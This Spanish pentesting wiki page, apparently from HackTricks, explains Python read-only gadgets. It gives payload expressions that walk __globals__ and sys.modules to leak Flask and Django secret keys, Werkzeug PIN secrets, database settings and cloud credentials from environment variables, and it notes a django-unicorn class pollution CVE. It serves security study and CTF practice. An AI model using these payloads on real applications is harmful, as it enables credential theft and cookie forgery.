# Gadgets de lectura interna de Python

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Diferentes vulnerabilidades, como [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) o [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), pueden permitirte **leer datos internos de Python pero no permitirán que ejecutes código**. Por lo tanto, un pentester tendrá que aprovechar al máximo estos permisos de lectura para **obtener privilegios sensibles y escalar la vulnerabilidad**.

### Flask - Leer la clave secreta

La página principal de una aplicación Flask probablemente tendrá el objeto global `app` donde se configura esta clave secreta.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
En este caso es posible acceder a este objeto simplemente usando cualquier gadget para **access global objects** desde la [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).

En el caso de que **the vulnerability is in a different python file**, necesitas un gadget para recorrer los archivos hasta llegar al archivo principal y **access the global object `app.secret_key`** para cambiar la Flask secret key y poder [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload como este [from this writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Usa este payload para **cambiar `app.secret_key`** (el nombre en tu app podría ser diferente) para poder firmar nuevas flask cookies con más privilegios.

### Werkzeug - machine_id and node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) podrás acceder al **machine_id** y al nodo **uuid**, que son los **secretos principales** que necesitas para [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) que puedes usar para acceder a la consola de python en `/console` si el **debug mode** está habilitado:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Ten en cuenta que puedes obtener la **ruta local del servidor al `app.py`** generando algún **error** en la página web que te **dará la ruta**.

Si la vulnerabilidad está en un archivo python diferente, revisa el truco anterior de Flask para acceder a los objetos del archivo python principal.

### Django - SECRET_KEY y módulo settings

El objeto settings de Django se cachea en `sys.modules` una vez que la aplicación se inicia. Con solo primitivas de lectura puedes leak la **`SECRET_KEY`**, credenciales de la base de datos o signing salts:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
```
Si el gadget vulnerable está en otro módulo, recorre globals primero:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
Una vez conocida la clave, puedes forjar Django signed cookies o tokens de manera similar a Flask.

### Variables de entorno / cloud creds a través de módulos cargados

Muchos jails siguen importando `os` o `sys` en algún punto. Puedes abusar de cualquier función accesible `__init__.__globals__` para pivotar al módulo `os` ya importado y volcar las **variables de entorno** que contengan API tokens, cloud keys o flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Si el índice de subclase está filtrado, usa loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Las variables de entorno son con frecuencia los únicos secretos necesarios para pasar de lectura a compromiso total (cloud IAM keys, database URLs, signing keys, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` (<0.62.0) permitió **class pollution** mediante solicitudes de componente manipuladas. Configurar una ruta de propiedad como `__init__.__globals__` permite a un atacante acceder a los globals del módulo del componente y a cualquier módulo importado (p. ej. `settings`, `os`, `sys`). Desde allí puedes leak `SECRET_KEY`, `DATABASES` o credenciales de servicio sin ejecución de código. La cadena de exploit es puramente de solo-lectura y utiliza los mismos patrones dunder-gadget mencionados arriba.

### Gadget collections for chaining

Recientes CTFs (p. ej. jailCTF 2025) muestran cadenas de lectura fiables construidas únicamente con acceso a atributos y enumeración de subclases. Listas mantenidas por la comunidad como [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) catalogan cientos de gadgets mínimos que puedes combinar para recorrer desde objetos hasta `__globals__`, `sys.modules` y finalmente datos sensibles. Úsalas para adaptarte rápidamente cuando los índices o los nombres de clase difieran entre versiones menores de Python.



## Referencias

- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
